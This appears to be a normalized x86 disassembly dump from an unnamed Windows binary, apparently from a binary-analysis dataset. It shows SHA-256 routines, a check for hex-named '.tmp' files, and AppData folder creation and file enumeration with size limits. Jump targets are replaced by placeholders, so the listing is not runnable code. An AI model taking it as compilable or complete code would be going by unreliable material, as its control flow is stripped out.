mov ebx ecx
or ecx [ ebp - 0x18 ]
ror ebx 0x2
xor edi ebx
add edi [ ebp + 0xc ]
mov ebx [ ebp - 0x8 ]
and ebx [ ebp - 0x18 ]
and ecx esi
or ecx ebx
add ecx edi
mov edi [ ebp - 0x5c ]
mov ebx [ ebp - 0x90 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x5c ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0x5c ]
shr ecx 0xa
xor edi ecx
mov ecx [ ebp - 0x90 ]
add edi [ ebp - 0x70 ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0x90 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0x94 ]
mov [ ebp - 0x54 ] ecx
mov ecx edx
ror ecx 0xb
mov edi edx
rol edi 0x7
xor ecx edi
mov edi edx
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0x54 ]
mov edi [ ebp - 0x4 ]
xor edi [ ebp + 0x8 ]
and edi edx
xor edi [ ebp - 0x4 ]
add edi ecx
mov ecx [ ebp - 0x14 ]
lea ecx [ edi + ecx + 0x2748774c ]
add esi ecx
mov edi [ ebp - 0x1c ]
mov [ ebp + 0xc ] ecx
mov ebx edi
ror ebx 0xd
mov ecx edi
rol ecx 0xa
xor ebx ecx
mov ecx edi
ror ecx 0x2
xor ebx ecx
add ebx [ ebp + 0xc ]
mov ecx [ ebp - 0x8 ]
or ecx edi
and ecx [ ebp - 0x18 ]
mov edi [ ebp - 0x8 ]
and edi [ ebp - 0x1c ]
or ecx edi
add ecx ebx
mov edi [ ebp - 0x58 ]
mov [ ebp - 0x14 ] ecx
mov ecx [ ebp - 0x58 ]
mov ebx [ ebp - 0x8c ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0x58 ]
shr ecx 0xa
xor edi ecx
add edi [ ebp - 0x6c ]
mov ecx [ ebp - 0x8c ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0x8c ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0x90 ]
mov edi esi
mov [ ebp - 0x50 ] ecx
mov ecx esi
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi esi
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0x50 ]
mov edi [ ebp + 0x8 ]
xor edi edx
and edi esi
xor edi [ ebp + 0x8 ]
add edi ecx
mov ecx [ ebp - 0x4 ]
lea ecx [ edi + ecx + 0x34b0bcb5 ]
add [ ebp - 0x18 ] ecx
mov edi [ ebp - 0x14 ]
mov [ ebp + 0xc ] ecx
mov ebx edi
ror ebx 0xd
mov ecx edi
rol ecx 0xa
xor ebx ecx
mov ecx edi
ror ecx 0x2
xor ebx ecx
add ebx [ ebp + 0xc ]
mov ecx [ ebp - 0x1c ]
or ecx edi
and ecx [ ebp - 0x8 ]
mov edi [ ebp - 0x1c ]
and edi [ ebp - 0x14 ]
or ecx edi
add ecx ebx
mov edi [ ebp - 0x54 ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x54 ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0x54 ]
shr ecx 0xa
xor edi ecx
add edi [ ebp - 0x68 ]
mov ecx [ ebp - 0x88 ]
mov ebx [ ebp - 0x88 ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0x88 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0x8c ]
mov [ ebp - 0x4c ] ecx
mov ecx [ ebp - 0x18 ]
mov edi ecx
mov ebx ecx
ror edi 0xb
rol ebx 0x7
xor edi ebx
mov ebx ecx
ror ebx 0x6
xor edi ebx
add edi [ ebp - 0x4c ]
mov ebx edx
xor ebx esi
and ebx ecx
mov ecx [ ebp + 0x8 ]
xor ebx edx
add ebx edi
mov edi [ ebp - 0x4 ]
lea ecx [ ebx + ecx + 0x391c0cb3 ]
add [ ebp - 0x8 ] ecx
mov [ ebp + 0xc ] ecx
mov ebx edi
ror ebx 0xd
mov ecx edi
rol ecx 0xa
xor ebx ecx
mov ecx edi
ror ecx 0x2
xor ebx ecx
mov ecx [ ebp - 0x14 ]
add ebx [ ebp + 0xc ]
or ecx edi
and ecx [ ebp - 0x1c ]
mov edi [ ebp - 0x14 ]
and edi [ ebp - 0x4 ]
or ecx edi
mov edi [ ebp - 0x50 ]
add ecx ebx
mov ebx [ ebp - 0x84 ]
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp - 0x50 ]
rol edi 0xf
rol ecx 0xd
xor edi ecx
mov ecx [ ebp - 0x50 ]
shr ecx 0xa
xor edi ecx
mov ecx [ ebp - 0x84 ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0x84 ]
shr ebx 0x3
add edi [ ebp - 0x64 ]
xor ecx ebx
add ecx edi
add ecx [ ebp - 0x88 ]
mov edi [ ebp - 0x8 ]
mov [ ebp - 0x48 ] ecx
mov ecx [ ebp - 0x8 ]
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi [ ebp - 0x8 ]
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0x48 ]
mov ebx [ ebp - 0x4 ]
mov edi esi
xor edi [ ebp - 0x18 ]
and edi [ ebp - 0x8 ]
xor edi esi
add edi ecx
lea edx [ edi + edx + 0x4ed8aa4a ]
add [ ebp - 0x1c ] edx
mov ecx [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
mov edi ecx
ror edi 0xd
mov edx ecx
rol edx 0xa
xor edi edx
and ebx ecx
mov edx ecx
ror edx 0x2
xor edi edx
add edi [ ebp + 0xc ]
mov edx [ ebp - 0x4 ]
or edx ecx
and edx [ ebp - 0x14 ]
or edx ebx
add edx edi
mov edi [ ebp - 0x4c ]
mov ebx [ ebp - 0x80 ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x4c ]
rol edi 0xf
rol edx 0xd
xor edi edx
mov edx [ ebp - 0x4c ]
shr edx 0xa
xor edi edx
add edi [ ebp - 0x60 ]
mov edx [ ebp - 0x80 ]
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ ebp - 0x80 ]
shr ebx 0x3
xor edx ebx
add edx edi
add edx [ ebp - 0x84 ]
mov edi [ ebp - 0x1c ]
mov [ ebp - 0x44 ] edx
mov edx [ ebp - 0x1c ]
ror edx 0xb
rol edi 0x7
xor edx edi
mov edi [ ebp - 0x1c ]
ror edi 0x6
xor edx edi
mov edi [ ebp - 0x8 ]
xor edi [ ebp - 0x18 ]
add edx [ ebp - 0x44 ]
and edi [ ebp - 0x1c ]
xor edi [ ebp - 0x18 ]
add edi edx
mov edx [ ebp - 0x10 ]
lea esi [ edi + esi + 0x5b9cca4f ]
add [ ebp - 0x14 ] esi
mov edi edx
mov [ ebp + 0xc ] esi
ror edi 0xd
mov esi edx
rol esi 0xa
xor edi esi
mov esi edx
ror esi 0x2
xor edi esi
add edi [ ebp + 0xc ]
mov esi ecx
or esi edx
and esi [ ebp - 0x4 ]
mov ebx ecx
and ebx edx
or esi ebx
add esi edi
mov edi [ ebp - 0x48 ]
mov [ ebp - 0xc ] esi
mov esi [ ebp - 0x48 ]
rol edi 0xf
rol esi 0xd
xor edi esi
mov esi [ ebp - 0x48 ]
shr esi 0xa
xor edi esi
add edi [ ebp - 0x5c ]
mov esi [ ebp - 0x7c ]
mov ebx [ ebp - 0x7c ]
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ ebp - 0x7c ]
shr ebx 0x3
xor esi ebx
add esi edi
add esi [ ebp - 0x80 ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x40 ] esi
mov esi [ ebp - 0x14 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x14 ]
ror edi 0x6
xor esi edi
add esi [ ebp - 0x40 ]
mov edi [ ebp - 0x8 ]
xor edi [ ebp - 0x1c ]
mov [ ebp + 0x8 ] edx
and edi [ ebp - 0x14 ]
xor edi [ ebp - 0x8 ]
add edi esi
mov esi [ ebp - 0x18 ]
lea esi [ edi + esi + 0x682e6ff3 ]
add [ ebp - 0x4 ] esi
mov [ ebp + 0xc ] esi
mov esi [ ebp - 0xc ]
or [ ebp + 0x8 ] esi
and [ ebp + 0x8 ] ecx
mov edi esi
ror edi 0xd
mov ebx esi
rol ebx 0xa
xor edi ebx
mov ebx esi
ror ebx 0x2
xor edi ebx
add edi [ ebp + 0xc ]
mov ebx edx
and ebx esi
mov esi [ ebp + 0x8 ]
or esi ebx
add esi edi
mov edi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] esi
mov esi [ ebp - 0x44 ]
rol edi 0xf
rol esi 0xd
xor edi esi
mov esi [ ebp - 0x44 ]
shr esi 0xa
xor edi esi
mov esi [ ebp - 0x78 ]
rol esi 0xe
add edi [ ebp - 0x58 ]
mov ebx [ ebp - 0x78 ]
ror ebx 0x7
xor esi ebx
mov ebx [ ebp - 0x78 ]
shr ebx 0x3
xor esi ebx
add esi edi
add esi [ ebp - 0x7c ]
mov edi [ ebp - 0x4 ]
mov [ ebp - 0x3c ] esi
mov esi [ ebp - 0x4 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x4 ]
ror edi 0x6
xor esi edi
add esi [ ebp - 0x3c ]
mov edi [ ebp - 0x1c ]
xor edi [ ebp - 0x14 ]
and edi [ ebp - 0x4 ]
xor edi [ ebp - 0x1c ]
add edi esi
mov esi [ ebp - 0x8 ]
lea esi [ edi + esi + 0x748f82ee ]
add ecx esi
mov [ ebp + 0xc ] esi
mov esi [ ebp - 0x18 ]
mov ebx esi
mov edi esi
ror ebx 0xd
rol edi 0xa
xor ebx edi
mov edi esi
ror edi 0x2
xor ebx edi
mov edi [ ebp - 0xc ]
or edi esi
add ebx [ ebp + 0xc ]
and edi edx
mov [ ebp + 0x8 ] edi
mov edi [ ebp - 0xc ]
and edi esi
mov esi [ ebp + 0x8 ]
or esi edi
mov edi [ ebp - 0x40 ]
add esi ebx
mov ebx [ ebp - 0x74 ]
mov [ ebp - 0x8 ] esi
mov esi [ ebp - 0x40 ]
rol edi 0xf
rol esi 0xd
xor edi esi
mov esi [ ebp - 0x40 ]
shr esi 0xa
xor edi esi
add edi [ ebp - 0x54 ]
mov esi [ ebp - 0x74 ]
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ ebp - 0x74 ]
shr ebx 0x3
xor esi ebx
add esi edi
add esi [ ebp - 0x78 ]
mov edi ecx
mov [ ebp - 0x38 ] esi
mov esi ecx
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi ecx
ror edi 0x6
xor esi edi
mov edi [ ebp - 0x14 ]
xor edi [ ebp - 0x4 ]
and edi ecx
xor edi [ ebp - 0x14 ]
add esi [ ebp - 0x38 ]
add edi esi
mov esi [ ebp - 0x1c ]
lea esi [ edi + esi + 0x78a5636f ]
add edx esi
mov [ ebp + 0xc ] esi
mov esi [ ebp - 0x8 ]
mov edi esi
mov ebx esi
ror edi 0xd
rol ebx 0xa
xor edi ebx
mov ebx esi
or esi [ ebp - 0x18 ]
ror ebx 0x2
and esi [ ebp - 0xc ]
xor edi ebx
add edi [ ebp + 0xc ]
mov ebx [ ebp - 0x8 ]
and ebx [ ebp - 0x18 ]
or esi ebx
add esi edi
mov edi [ ebp - 0x3c ]
mov [ ebp - 0x1c ] esi
mov esi [ ebp - 0x3c ]
rol edi 0xf
rol esi 0xd
xor edi esi
mov esi [ ebp - 0x3c ]
shr esi 0xa
xor edi esi
add edi [ ebp - 0x50 ]
mov esi [ ebp - 0x70 ]
mov ebx [ ebp - 0x70 ]
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ ebp - 0x70 ]
shr ebx 0x3
xor esi ebx
add esi edi
add esi [ ebp - 0x74 ]
mov edi edx
mov [ ebp - 0x34 ] esi
mov esi edx
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi edx
ror edi 0x6
xor esi edi
add esi [ ebp - 0x34 ]
mov edi [ ebp - 0x4 ]
xor edi ecx
and edi edx
xor edi [ ebp - 0x4 ]
add edi esi
mov esi [ ebp - 0x14 ]
lea esi [ edi + esi - 0x7b3787ec ]
add [ ebp - 0xc ] esi
mov edi [ ebp - 0x1c ]
mov [ ebp + 0xc ] esi
mov ebx edi
ror ebx 0xd
mov esi edi
rol esi 0xa
xor ebx esi
mov esi edi
ror esi 0x2
xor ebx esi
mov esi [ ebp - 0x8 ]
add ebx [ ebp + 0xc ]
or esi edi
and esi [ ebp - 0x18 ]
mov edi [ ebp - 0x8 ]
and edi [ ebp - 0x1c ]
or esi edi
add esi ebx
mov [ ebp - 0x14 ] esi
mov esi [ ebp - 0x38 ]
mov edi esi
rol edi 0xf
mov ebx esi
shr esi 0xa
rol ebx 0xd
xor edi ebx
xor edi esi
add edi [ ebp - 0x4c ]
mov esi [ ebp - 0x6c ]
rol esi 0xe
mov ebx [ ebp - 0x6c ]
ror ebx 0x7
xor esi ebx
mov ebx [ ebp - 0x6c ]
shr ebx 0x3
xor esi ebx
add esi edi
add esi [ ebp - 0x70 ]
mov [ ebp - 0x30 ] esi
mov esi [ ebp - 0xc ]
mov edi esi
ror edi 0xb
mov ebx esi
rol ebx 0x7
xor edi ebx
mov ebx esi
ror ebx 0x6
xor edi ebx
add edi [ ebp - 0x30 ]
mov ebx ecx
xor ebx edx
and ebx esi
mov esi [ ebp - 0x4 ]
xor ebx ecx
add ebx edi
mov edi [ ebp - 0x14 ]
lea esi [ ebx + esi - 0x7338fdf8 ]
add [ ebp - 0x18 ] esi
mov [ ebp + 0xc ] esi
mov ebx edi
ror ebx 0xd
mov esi edi
rol esi 0xa
xor ebx esi
mov esi edi
ror esi 0x2
xor ebx esi
add ebx [ ebp + 0xc ]
mov esi [ ebp - 0x1c ]
or esi edi
and esi [ ebp - 0x8 ]
mov edi [ ebp - 0x1c ]
and edi [ ebp - 0x14 ]
or esi edi
add esi ebx
mov [ ebp - 0x4 ] esi
mov esi [ ebp - 0x34 ]
mov edi esi
mov ebx esi
rol edi 0xf
shr esi 0xa
rol ebx 0xd
xor edi ebx
mov ebx [ ebp - 0x68 ]
xor edi esi
mov esi [ ebp - 0x68 ]
add edi [ ebp - 0x48 ]
rol esi 0xe
ror ebx 0x7
xor esi ebx
mov ebx [ ebp - 0x68 ]
shr ebx 0x3
xor esi ebx
add esi edi
add esi [ ebp - 0x6c ]
mov edi [ ebp - 0x18 ]
mov [ ebp - 0x2c ] esi
mov esi [ ebp - 0x18 ]
ror esi 0xb
rol edi 0x7
xor esi edi
mov edi [ ebp - 0x18 ]
ror edi 0x6
xor esi edi
add esi [ ebp - 0x2c ]
mov edi edx
xor edi [ ebp - 0xc ]
and edi [ ebp - 0x18 ]
xor edi edx
add edi esi
lea ecx [ edi + ecx - 0x6f410006 ]
mov esi [ ebp - 0x8 ]
add esi ecx
mov [ ebp + 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov ebx ecx
mov edi ecx
ror ebx 0xd
rol edi 0xa
xor ebx edi
mov edi ecx
ror edi 0x2
xor ebx edi
add ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
or edi ecx
and edi [ ebp - 0x1c ]
mov [ ebp + 0x8 ] edi
mov edi [ ebp - 0x14 ]
and edi ecx
mov ecx [ ebp + 0x8 ]
or ecx edi
add ecx ebx
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp - 0x30 ]
mov edi ecx
rol edi 0xf
mov ebx ecx
shr ecx 0xa
rol ebx 0xd
xor edi ebx
xor edi ecx
add edi [ ebp - 0x44 ]
mov ecx [ ebp - 0x64 ]
mov ebx [ ebp - 0x64 ]
rol ecx 0xe
ror ebx 0x7
xor ecx ebx
mov ebx [ ebp - 0x64 ]
shr ebx 0x3
xor ecx ebx
add ecx edi
add ecx [ ebp - 0x68 ]
mov edi esi
mov [ ebp - 0x28 ] ecx
mov ecx esi
ror ecx 0xb
rol edi 0x7
xor ecx edi
mov edi esi
ror edi 0x6
xor ecx edi
add ecx [ ebp - 0x28 ]
mov edi [ ebp - 0xc ]
xor edi [ ebp - 0x18 ]
mov ebx [ ebp - 0x4 ]
and edi esi
xor edi [ ebp - 0xc ]
add edi ecx
lea edx [ edi + edx - 0x5baf9315 ]
add [ ebp - 0x1c ] edx
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
mov edi edx
ror edi 0xd
mov ecx edx
rol ecx 0xa
xor edi ecx
mov ecx edx
ror ecx 0x2
xor edi ecx
mov ecx [ ebp - 0x4 ]
or ecx edx
and ecx [ ebp - 0x14 ]
add edi [ ebp + 0xc ]
and ebx edx
or ecx ebx
add ecx edi
mov edx [ ebp - 0x2c ]
mov edi edx
rol edi 0xf
mov ebx edx
shr edx 0xa
rol ebx 0xd
xor edi ebx
xor edi edx
add edi [ ebp - 0x40 ]
mov edx [ ebp - 0x60 ]
mov ebx [ ebp - 0x60 ]
rol edx 0xe
ror ebx 0x7
xor edx ebx
mov ebx [ ebp - 0x60 ]
shr ebx 0x3
xor edx ebx
add edx edi
add edx [ ebp - 0x64 ]
mov edi [ ebp - 0x1c ]
mov ebx [ ebp - 0x1c ]
ror edi 0xb
rol ebx 0x7
xor edi ebx
mov ebx [ ebp - 0x1c ]
ror ebx 0x6
xor edi ebx
add edi edx
mov edx [ ebp - 0xc ]
mov ebx esi
xor ebx [ ebp - 0x18 ]
mov [ ebp - 0x10 ] ecx
and ebx [ ebp - 0x1c ]
xor ebx [ ebp - 0x18 ]
add ebx edi
lea edx [ ebx + edx - 0x41065c09 ]
add [ ebp - 0x14 ] edx
mov ebx [ ebp + 0x8 ]
mov [ ebp + 0xc ] edx
mov edi ecx
ror edi 0xd
mov edx ecx
rol edx 0xa
xor edi edx
mov edx ecx
ror edx 0x2
xor edi edx
add edi [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
or edx ecx
and edx [ ebp - 0x4 ]
and ebx ecx
mov ecx [ ebp - 0x14 ]
or edx ebx
add edx edi
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x14 ]
ror edx 0xb
rol ecx 0x7
xor edx ecx
mov ecx [ ebp - 0x14 ]
ror ecx 0x6
xor edx ecx
mov ecx [ ebp - 0x28 ]
mov edi ecx
rol edi 0xf
mov ebx ecx
rol ebx 0xd
xor edi ebx
shr ecx 0xa
xor edi ecx
mov ecx [ ebp - 0x5c ]
add edx edi
mov edi ecx
mov ebx ecx
rol edi 0xe
ror ebx 0x7
shr ecx 0x3
xor edi ebx
xor edi ecx
add edi [ ebp - 0x3c ]
mov ecx esi
xor ecx [ ebp - 0x1c ]
add edi edx
and ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
xor ecx esi
add ecx edi
add ecx [ ebp - 0x60 ]
mov ebx [ ebp - 0x10 ]
lea ecx [ ecx + edx - 0x398e870e ]
mov [ ebp + 0xc ] ecx
mov ecx [ ebp - 0xc ]
mov edx ecx
mov edi ecx
ror edx 0xd
rol edi 0xa
xor edx edi
mov edi ecx
ror edi 0x2
xor edx edi
mov edi [ ebp - 0x10 ]
add edx [ eax + 0x8 ]
or edi ecx
and edi [ ebp + 0x8 ]
and ebx ecx
or edi ebx
add edi edx
mov edx [ ebp + 0xc ]
add edi edx
mov [ eax + 0x8 ] edi
mov edi [ eax + 0xc ]
add edi ecx
mov ecx [ eax + 0x10 ]
mov [ eax + 0xc ] edi
mov edi [ ebp - 0x10 ]
add ecx edi
mov edi [ ebp + 0x8 ]
mov [ eax + 0x10 ] ecx
mov ecx [ eax + 0x14 ]
add ecx edi
mov [ eax + 0x14 ] ecx
mov ecx [ eax + 0x18 ]
add ecx edx
add ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x18 ] ecx
mov ecx [ eax + 0x1c ]
add ecx edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x1c ] ecx
mov ecx [ eax + 0x20 ]
add ecx edx
mov [ eax + 0x20 ] ecx
mov ecx [ eax + 0x24 ]
pop edi
add ecx esi
pop esi
mov [ eax + 0x24 ] ecx
pop ebx
leave
retn
sub_408e38
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
pop ebp
retn
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
push edi
mov edi eax
push 0x40
and edi 0x3f
pop ebx
add eax ecx
sub ebx edi
cmp eax ecx
mov [ esi ] eax
jae r-xdata
test edi edi
je r-xdata
inc [ esi + 0x4 ]
cmp ecx 0x40
jb r-xdata
cmp ecx ebx
jb r-xdata
test ecx ecx
je r-xdata
mov ebx ecx
shr ebx 0x6
push ebx
push [ ebp + 0xc ]
lea eax [ edi + esi + 0x28 ]
push eax
call sub_405366
lea eax [ esi + 0x28 ]
push eax
push esi
call sub_40657b
sub [ ebp + 0x10 ] ebx
add [ ebp + 0xc ] ebx
mov ecx [ ebp + 0x10 ]
add esp 0x14
xor edi edi
pop edi
pop esi
pop ebx
push ecx
push [ ebp + 0xc ]
lea eax [ edi + esi + 0x28 ]
push eax
call sub_405366
add esp 0xc
push [ ebp + 0xc ]
push esi
call sub_40657b
sub [ ebp + 0x10 ] 0x40
add [ ebp + 0xc ] 0x40
dec ebx
pop ecx
pop ecx
jne r-xdata
mov ecx [ ebp + 0x10 ]
sub_408ece
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi ]
mov eax [ esi + 0x4 ]
shl eax 0x3
mov edx ecx
shr edx 0x1d
or eax edx
mov ebx eax
shr ebx 0x18
mov [ ebp - 0x8 ] bl
mov ebx eax
shr ebx 0x10
mov [ ebp - 0x5 ] al
mov edx ecx
shl edx 0x3
mov [ ebp - 0x7 ] bl
mov ebx eax
mov eax edx
shr eax 0x18
mov [ ebp - 0x4 ] al
mov eax edx
shr eax 0x10
mov [ ebp - 0x3 ] al
mov eax edx
shr eax 0x8
push 0x38
mov [ ebp - 0x2 ] al
shr ebx 0x8
and ecx 0x3f
pop eax
cmp ecx eax
mov [ ebp - 0x6 ] bl
mov [ ebp - 0x1 ] dl
jb r-xdata
sub eax ecx
push eax
push rw-data
push esi
call sub_408e38
push 0x8
lea eax [ ebp - 0x8 ]
push eax
push esi
call sub_408e38
mov cl [ esi + 0xb ]
mov eax [ ebp + 0xc ]
mov [ eax ] cl
mov cl [ esi + 0xa ]
mov [ eax + 0x1 ] cl
mov ecx [ esi + 0x8 ]
shr ecx 0x8
mov [ eax + 0x2 ] cl
mov cl [ esi + 0x8 ]
mov [ eax + 0x3 ] cl
mov cl [ esi + 0xf ]
mov [ eax + 0x4 ] cl
mov cl [ esi + 0xe ]
mov [ eax + 0x5 ] cl
mov ecx [ esi + 0xc ]
shr ecx 0x8
mov [ eax + 0x6 ] cl
mov cl [ esi + 0xc ]
mov [ eax + 0x7 ] cl
mov cl [ esi + 0x13 ]
mov [ eax + 0x8 ] cl
mov cl [ esi + 0x12 ]
mov [ eax + 0x9 ] cl
mov ecx [ esi + 0x10 ]
shr ecx 0x8
mov [ eax + 0xa ] cl
mov cl [ esi + 0x10 ]
mov [ eax + 0xb ] cl
mov cl [ esi + 0x17 ]
mov [ eax + 0xc ] cl
mov cl [ esi + 0x16 ]
mov [ eax + 0xd ] cl
mov ecx [ esi + 0x14 ]
shr ecx 0x8
mov [ eax + 0xe ] cl
mov cl [ esi + 0x14 ]
mov [ eax + 0xf ] cl
mov cl [ esi + 0x1b ]
mov [ eax + 0x10 ] cl
mov cl [ esi + 0x1a ]
mov [ eax + 0x11 ] cl
mov ecx [ esi + 0x18 ]
shr ecx 0x8
mov [ eax + 0x12 ] cl
mov cl [ esi + 0x18 ]
mov [ eax + 0x13 ] cl
mov cl [ esi + 0x1f ]
mov [ eax + 0x14 ] cl
mov cl [ esi + 0x1e ]
mov [ eax + 0x15 ] cl
mov ecx [ esi + 0x1c ]
shr ecx 0x8
mov [ eax + 0x16 ] cl
mov cl [ esi + 0x1c ]
mov [ eax + 0x17 ] cl
mov cl [ esi + 0x23 ]
mov [ eax + 0x18 ] cl
mov cl [ esi + 0x22 ]
mov [ eax + 0x19 ] cl
mov ecx [ esi + 0x20 ]
shr ecx 0x8
mov [ eax + 0x1a ] cl
mov cl [ esi + 0x20 ]
mov [ eax + 0x1b ] cl
mov cl [ esi + 0x27 ]
mov [ eax + 0x1c ] cl
mov cl [ esi + 0x26 ]
mov [ eax + 0x1d ] cl
mov ecx [ esi + 0x24 ]
add esp 0x18
shr ecx 0x8
mov [ eax + 0x1e ] cl
mov cl [ esi + 0x24 ]
pop esi
mov [ eax + 0x1f ] cl
pop ebx
leave
retn
push 0x78
pop eax
sub_40902a
mov edx [ esp + 0x4 ]
xor ecx ecx
cmp al 0x41
jl r-xdata
cmp al 0x39
jle r-xdata
sub al 0x61
cmp al 0x5
ja r-xdata
cmp al 0x46
jle r-xdata
inc ecx
cmp ecx 0x20
jl r-xdata
xor eax eax
jmp r-xdata
mov al [ ecx + edx ]
cmp al 0x30
jl r-xdata
xor eax eax
cmp [ edx + 0x20 ] 0x706d742e
sete al
retn 0x4
sub_40908b
push ebp
mov ebp esp
sub esp 0x540
push ebx
push esi
push edi
mov esi ecx
lea edi [ esi + 0x177c ]
push edi
xor ebx ebx
push ebx
push ebx
push 0x1a
push ebx
call [ SHGetFolderPathA@IAT ]
push edi
call sub_40a052
mov [ esp ] rw-data
call sub_402a88
push eax
push edi
call sub_409cb9
add esp 0xc
push ebx
push edi
call [ CreateDirectoryA@IAT ]
push ebx
lea eax [ ebp - 0x540 ]
push edi
push eax
call sub_409cdd
lea eax [ ebp - 0x540 ]
push rw-data
push eax
call sub_409cb9
add esp 0x14
mov ecx esi
call sub_409991
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ esi + 0x1754 ]
mov [ eax + 0x14 ] ebx
mov eax [ esi + 0x1754 ]
mov [ eax + 0x18 ] ebx
lea eax [ ebp - 0x140 ]
push eax
lea eax [ ebp - 0x540 ]
push eax
call [ FindFirstFileA@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ecx esi
call sub_409978
test [ ebp - 0x140 ] 0x10
jne r-xdata
lea eax [ ebp - 0x140 ]
push eax
push edi
call [ FindNextFileA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x114 ]
push eax
mov ecx esi
call sub_40902a
test eax eax
je r-xdata
push edi
call [ FindClose@IAT ]
mov eax [ esi + 0x1754 ]
mov ecx [ ebp - 0x120 ]
add [ eax + 0x18 ] ecx
mov eax [ esi + 0x1754 ]
inc [ eax + 0x14 ]
sub_40918f
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ eax ]
mov eax [ eax + 0x4 ]
push esi
mov esi [ ecx ]
mov ecx [ ecx + 0x4 ]
cmp eax ecx
jl r-xdata
sub esi edx
sbb ecx eax
mov edx esi
mov eax ecx
jg r-xdata
sub edx esi
sbb eax ecx
jmp r-xdata
cmp edx esi
jbe r-xdata
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push 0x8ca0
push eax
push eax
mov [ ebp - 0x8 ] edx
call sub_405f68
mov esi 0x3e8
lea eax [ ebp - 0x8 ]
push esi
push eax
push eax
call sub_405f68
lea eax [ ebp - 0x8 ]
push esi
push eax
push eax
call sub_405f68
mov eax [ ebp - 0x8 ]
add esp 0x24
pop esi
leave
retn 0x8
sub_4091f8
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_409991
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
test edx edx
push edi
jne r-xdata
inc eax
jmp r-xdata
mov edi [ ebp + 0x8 ]
xor edi edi
jmp r-xdata
pop esi
pop ebp
retn 0x4
jge r-xdata
xor edi edi
inc edi
test edx edx
test edx edx
jle r-xdata
mov eax [ esi + 0x1754 ]
mov ecx [ eax + 0x18 ]
push ebx
mov ebx [ esi + 0x1b7c ]
shl ebx 0xa
add ecx edx
cmp ecx ebx
pop ebx
jbe r-xdata
or edi 0xffffffff
mov eax [ eax + 0x14 ]
inc eax
cmp eax [ esi + 0x1b80 ]
jbe r-xdata
mov ecx esi
call sub_409978
xor eax eax
inc eax
mov ecx esi
call sub_409978
mov eax edi
jmp r-xdata
lea eax [ esi + 0x1754 ]
mov ecx [ eax ]
add [ ecx + 0x18 ] edx
mov eax [ eax ]
add [ eax + 0x14 ] edi
xor edi edi
jmp r-xdata
xor edi edi
inc edi
pop edi
sub_40927f
push ebp
mov ebp esp
sub esp 0x404
push esi
push edi
push 0x3d
mov esi 0x400
push esi
lea eax [ ebp - 0x404 ]
push eax
push rw-data
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x404 ] 0x0
call sub_402a88
mov edi [ ebp + 0x8 ]
pop ecx
push eax
push edi
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
push 0x3d
push esi
lea eax [ ebp - 0x404 ]
push eax
push rw-data
mov [ ebp - 0x404 ] 0x0
call sub_402a88
pop ecx
push eax
push edi
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
lea eax [ ebp - 0x404 ]
push eax
call sub_40a0d0
pop ecx
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x1b8c ] eax
push 0x3d
push esi
lea eax [ ebp - 0x404 ]
push eax
push rw-data
mov [ ebp - 0x404 ] 0x0
call sub_402a88
pop ecx
push eax
push edi
call sub_40a1d9
add esp 0x14
test al al
je r-xdata
lea eax [ ebp - 0x404 ]
push eax
call sub_40a0d0
pop ecx
mov ecx [ ebp - 0x4 ]
